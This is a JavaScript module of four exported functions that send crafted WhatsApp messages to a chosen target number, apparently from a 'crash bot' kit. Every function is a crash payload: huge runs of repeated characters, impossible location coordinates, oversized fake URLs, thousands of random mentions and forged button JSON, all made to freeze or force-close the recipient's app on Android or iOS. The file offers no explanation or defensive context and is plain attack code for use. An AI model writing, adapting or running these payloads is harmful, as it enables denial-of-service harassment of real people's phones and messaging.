async function locdroid(client, target) { 
  const trigger = "ꦾ".repeat(65000);
  const urlbokep = `https://${trigger}.crash.whatsapp-android.pnx.com/${trigger}/${trigger}/${trigger}/`;
  await client.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: trigger,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: urlbokep,
        url: urlbokep,
        thumbnailUrl: urlbokep,
        waWebSocketUrl: urlbokep,
        mediaUrl: urlbokep,
        sourceUrl: urlbokep,
        originalImageUrl: urlbokep,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"X"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: trigger,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              caption: trigger,
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: true,
              id: "ABCDEF1234567890"
            }
          },
          mentionedJid: [
            target,
            "13135550002@s.whatsapp.net",
            ...Array.from(
            { length: 1998 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
          stanzaId: client.generateMessageTag(),
          quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: 999e+21 * Date.now()
            }
          },
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
};

async function FChyUi(sock, target) {
  let hyuiForceX = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });
  const contextInfo = {
    mentionedJid: [target],
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };

  let messagePayload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo,
          body: {
            text: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: hyuiForceX + "\u0003",
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    participant: { jid: target },
  });
}

async function ComBoxFC(sock, target) {
  let hyuiForceX2 = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });
  const contextInfo = {
    mentionedJid: [target],
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };

  let messagePayload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo,
          body: {
            text: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: hyuiForceX2 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: hyuiForceX2 + "\u0003",
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    participant: { jid: target },
  });
}

async function CrashIos(sock, target) {
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

module.exports = { locdroid, FChyUi, ComBoxFC, CrashIos };